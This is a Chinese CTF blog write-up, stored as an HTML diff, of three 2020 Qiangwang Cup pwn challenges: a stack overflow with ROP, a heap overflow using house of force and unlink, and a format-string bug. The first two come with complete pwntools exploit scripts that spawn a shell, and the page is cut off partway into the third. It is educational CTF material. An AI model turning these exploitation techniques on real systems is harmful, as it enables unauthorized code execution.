@@ -1,0 +1,1216 @@
+<!DOCTYPE html>
+<html lang="">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="hurricane618">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="hurricane618">
+    
+    <meta name="keywords" content="hexo,web security,ctf,hurricane618,代码审计,iot">
+    
+    <meta name="description" content="hurricane618's blog">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>2020强网杯 强网先锋のpwn · 风之栖息地|hurricane618&#39;s blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/hurricane_favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+    <script>
+        (function (i, s, o, g, r, a, m) {
+        i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+        (i[r].q = i[r].q || []).push(arguments)
+        }, i[r].l = 1 * new Date(); a = s.createElement(o),
+        m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+        })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+        ga('create', 'UA-121933059-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">风之栖息地</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">2020强网杯 强网先锋のpwn</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">风之栖息地</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg1.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            2020强网杯 强网先锋のpwn
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="stackoverflow">stackoverflow</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="heap">heap</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">3.4k</span>阅读时长: <span class="post-count reading-time">14 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/09/15</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>受到摸鱼和各种项目压力之后，终于发出来了，这次是强网杯中强网先锋的4道pwn题，剩下的pwn题还在陆续复现ing，在做了在做了ing</p>
+<h2 id="babymessage"><a href="#babymessage" class="headerlink" title="babymessage"></a>babymessage</h2><p>一道神奇的栈溢出题目，有三个功能，写name，写message，输出buf，其中message的数据会被strcopy到buf上。这里的溢出点是在写message的功能上，一开始只能够溢出16字节，覆盖掉栈变量+rbp的值。这里如果只是看反编译的代码是看不出问题的，一定要观察汇编代码，这也是我经常失误的地方不太爱看汇编，555555。</p>
+<p>这里的写message的函数里带着一个局部变量size，而这个变量因为是局部变量，它是受到rbp的值影响的。</p>
+<img src="/2020/09/15/2020qwb-qwxf-pwn/1.png">
+<p>所以我们的溢出点控制住了rbp，就能够控制这个size局部变量的值，那么我们的输入大小就会增大，可以在栈上布置rop chain。那么这里有哪些合适的地方呢？因为这个程序没有开启aslr，所以我们可以找bss段上的数据，也就是name或者buf，而这里刚好有功能可以写到这两个地方，那么思路就有了。</p>
+<p>通过相关功能向name或者buf写入一个足够大的数，然后通过溢出修改rbp的值，让<code>rbp-0x4</code>其指向我们修改的地方，这样size就被我们控制住了，随后按照一般的ROP操作泄露libc，返回溢出点再次溢出getshell。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">'debug'</span>)</span><br><span class="line">io = process(<span class="string">'./babymessage'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./babymessage'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">l_name</span><span class="params">(name)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choice: \n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'name: \n'</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">l_mess</span><span class="params">(message)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choice: \n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'message: \n'</span>)</span><br><span class="line">    io.send(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choice: \n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name = <span class="number">0x6010D0</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400ac3</span></span><br><span class="line">message = <span class="number">0x400995</span></span><br><span class="line">pause()</span><br><span class="line">l_name(p32(<span class="number">0x1000</span>))</span><br><span class="line">l_mess(<span class="string">'a'</span> * <span class="number">8</span> + p64(name + <span class="number">4</span>))</span><br><span class="line">pause()</span><br><span class="line">l_mess(<span class="string">'a'</span> * <span class="number">8</span> + p64(name + <span class="number">4</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(message))</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_addr = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">info(<span class="string">'libc address: '</span> + hex(libc_addr))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">bin_sh = libc_addr + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">pause()</span><br><span class="line">io.sendafter(<span class="string">'message:'</span>, <span class="string">'a'</span> * <span class="number">8</span> + p64(name + <span class="number">4</span>) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="babynote"><a href="#babynote" class="headerlink" title="babynote"></a>babynote</h2><p>这道题的漏洞点在于使用了字符串复制函数strcpy，但是name数组并没有在末尾添加<code>\x00</code>，虽然在一开始对相应区域初始化为0，但是我们如果把name全部填满，那么在字符串复制的时候会认为name与之后的age为同一部分，最终会把后面的age部分一同复制，这样针对dest的复制会溢出。</p>
+<img src="/2020/09/15/2020qwb-qwxf-pwn/2.png">
+<p>这里针对dest的溢出最多能溢出8个字节，而这里的dest正好size为0x18，这就意味着它占用了下一个chunk的prev_size区域，这溢出的8个字节能够刚好覆盖下一个chunk的size区域。</p>
+<p>我们能控制下一块chunk的size，碰巧的是这下一块chunk刚好是top chunk，同时也能分配小于0x100的chunk，这刚好满足house of force的攻击要求，缺点是向高地址移动距离有限，更多的只能让top chunk向低地址移动。</p>
+<h3 id="house-of-force-unlink-fastbin-attack"><a href="#house-of-force-unlink-fastbin-attack" class="headerlink" title="house of force + unlink/fastbin attack"></a>house of force + unlink/fastbin attack</h3><p>首先，我们布置三个0x100的堆块等待之后能任意分配chunk时构造unlink，随后利用程序提供的重置功能，触发上面的字符串复制的漏洞覆盖top chunk的size区域为-1，换算成补码也就是<code>0xffffffffffffffff</code>。在分配chunk的时候size会被当做无符号数，所以-1会变成最大值。想要控制三块0x100中间的chunk，需要调试计算其中的差值，而这个差值还需要再减0x10，为什么要减0x10，也是因为我们请求的大小会被转换成请求chunk的大小，有一个chunk head的部分需要0x10字节。</p>
+<img src="/2020/09/15/2020qwb-qwxf-pwn/3.png">
+<p>这里我们的top chunk起始地址为0x1d0f590，我们的目标是控制第二个chunk也就是0x1d0f240，为了控制这个chunk就需要能改变chunk头部，所以我们分配chunk到0x1d0f230，刚好就能写到头部，改变prev_size和size。中间差了0x360再加上0x10一共0x370。通过分配调整top chunk位置之后，我们只需要再次分配0x20大小的chunk就能控制头部。这里申请0x10和0x20都是一个效果，申请0x10会得到0x20的chunk，申请0x20会得到0x30的chunk。</p>
+<p>在能够控制头部之后，伪造prev_size和size，让堆管理认为前面的chunk已经释放，删除中间的块触发unlink前面的chunk，在删除之前需要在前面的chunk中布置需要改变的地址-0x18和地址-0x10，最后造成的效果是目标地址的值变成地址的值-0x18。有了这个我们能改变指针的值，让它指向地址前面，配合程序的修改功能我们能泄露写进的got函数地址，同时能把它修改成其他函数，比如system。这里就是先泄露free函数，获得libc基地址，再写入system地址。最后构造一个chunk，里面的内容为<code>/bin/sh\x00</code>，将其释放即可获得shell。</p>
+<p>这里其实也可以不用unlink攻击，可以使用fastbin attack，我们已经能分配到低地址的chunk，那么也能够修改释放进fastbin的chunk，让其指向free_hook或者malloc_hook的低地址处，分配拿到chunk后直接修改为one_gadget。</p>
+<h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off by one"></a>off by one</h3><p>这是另外一种思路，同样利用strcpy溢出chunk的size区域，不过这里只溢出一个字节，首先申请一个0x18字节的note，再释放它使其进入fastbin中，这样之后修改name时申请的0x18字节会在fastbin中取到这个chunk，达到我们想要溢出的地点。控制chunk的大小为small bin范围，随后释放这个chunk，让它进入unsorted bin中，再次分配原来大小的chunk，在fastbin中没有合适的chunk时会切分unsorted bin中的chunk，切分之后剩下的部分依旧在unsorted bin里面，它的指针会被写进之前chunk的下一块chunk中，这样利用输出功能就能泄露出libc相关地址，得到libc基地址。</p>
+<p>在泄露完成之后，再次分配下一个chunk同样大小的chunk，我们就拿到了两个指向同一chunk的指针，通过这个可以开始uaf攻击，释放其中一个指针，让这个chunk进入fastbin中，再通过另外一个指针修改fastbin指针，指向malloc_hook的低地址处，随后就是分配两次0x70的chunk，第二次就能拿到我们想要的chunk，写入one_gadget覆盖malloc_hook的位置，完成getshell。</p>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>这里给的是house of force方法的exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./babynotes'</span>)</span><br><span class="line"><span class="comment">#sh = remote('123.56.170.202',43121)</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./babynotes'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">'Input your name:'</span>,<span class="string">'haivk'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'Input your motto:'</span>,<span class="string">'pwnit'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'Input your age:'</span>,<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,size)</span>:</span></span><br><span class="line">   sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">'Input index:'</span>,str(index))</span><br><span class="line">   sh.sendlineafter(<span class="string">'Input note size:'</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">   sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">'Input index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">   sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'3'</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">'Input index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">   sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'4'</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">'Input index:'</span>,str(index))</span><br><span class="line">   sh.sendafter(<span class="string">'Input your note:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset</span><span class="params">()</span>:</span></span><br><span class="line">   sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x100</span>)</span><br><span class="line">pause()</span><br><span class="line">reset()</span><br><span class="line">sh.sendafter(<span class="string">'Input your name:'</span>,<span class="string">'haivk'</span>.ljust(<span class="number">0x18</span>,<span class="string">'a'</span>))</span><br><span class="line">sh.sendafter(<span class="string">'Input your motto:'</span>,<span class="string">'pwnit'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'Input your age:'</span>,<span class="string">'-1'</span>)</span><br><span class="line">pause()</span><br><span class="line">add(<span class="number">4</span>,<span class="number">-0x370</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x20</span>) <span class="comment"># get chunk1 head</span></span><br><span class="line"><span class="comment">#top chunk上移</span></span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0x100</span>) + p64(<span class="number">0x110</span>))</span><br><span class="line">heap0_ptr_addr = <span class="number">0x6020E0</span></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(heap0_ptr_addr - <span class="number">0x18</span>) + p64(heap0_ptr_addr - <span class="number">0x10</span>))</span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span> + p64(free_got))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Note 0: '</span>)</span><br><span class="line">free_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = free_addr - libc.sym[<span class="string">'free'</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">edit(<span class="number">0</span>,p64(system_addr))</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="Siri"><a href="#Siri" class="headerlink" title="Siri"></a>Siri</h2><p>一个典型的格式化字符串漏洞，出现在0x1212函数中。</p>
+<img src="/2020/09/15/2020qwb-qwxf-pwn/4.png">
+<p>输入<code>Hey Siri!</code>启动siri之后，我们输入开头带有<code>remind me to</code>的字符串，就能进入漏洞点。我们在<code>remind me to</code>之后的输入内容会被带入新的字符串中，printf触发这个格式化字符串的漏洞。</p>
+<p>首先利用漏洞泄露数据，包括栈地址和libc地址，构造格式化字符串<code>%83$p</code>和<code>%44$p</code>可以获取到libc相关的地址和栈地址。剩下就是通过格式化字符串构造任意写，向一些地址写one_gadget。</p>
+<p>构造任意写的方法就是在栈上布置一些需要写的地址，然后通过<code>%yyc%xx$hhn</code>的方法向栈上那个偏移量的地址写值。其中有些地方需要对齐，所以在某地位置要填充数据保证对齐。有了任意地址写，我们的方法就有很多了。</p>
+<h3 id="改写hook"><a href="#改写hook" class="headerlink" title="改写hook"></a>改写hook</h3><p>改写<code>malloc_hook</code>，写其中写入one_gadget，然后输入大量的字符串，这样就会触发malloc，拿到shell。</p>
+<h3 id="改写返回地址"><a href="#改写返回地址" class="headerlink" title="改写返回地址"></a>改写返回地址</h3><p>改写main函数的返回地址，但是没有办法直接返回到main函数，所以再最后一次改写子函数的返回地址，让它的返回地址指向<code>leave ret</code>，这样就会进行栈迁移，使得SP指向main函数的返回地址，也就是one_gadget处。</p>
+<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><p>注意一点，给的libc和ubuntu自带的libc有一些不同，所以在打远程的时候要用它给的libc。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 